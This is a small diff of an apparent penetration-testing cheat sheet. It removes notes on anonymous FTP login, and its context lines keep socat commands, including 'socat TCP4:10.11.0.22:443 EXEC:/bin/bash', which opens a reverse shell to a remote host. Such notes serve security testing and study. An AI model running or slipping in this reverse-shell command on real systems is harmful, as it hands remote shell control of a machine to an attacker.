@@ -70,13 +70,6 @@ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
 socat - TCP4:172.16.53.20:456(shell connection)
 ```
 
-### FTP(permitted commands:ls,mkdir,put file, get file)
-```
-anonymous login: ftp ip; username:anonymous;password:blank; 
-ascii mode: ascii
-binary mode: bin
-```
-
 ### IPTables
 ```
 sudo iptables -L (show iptables) --line-numbers(optional)
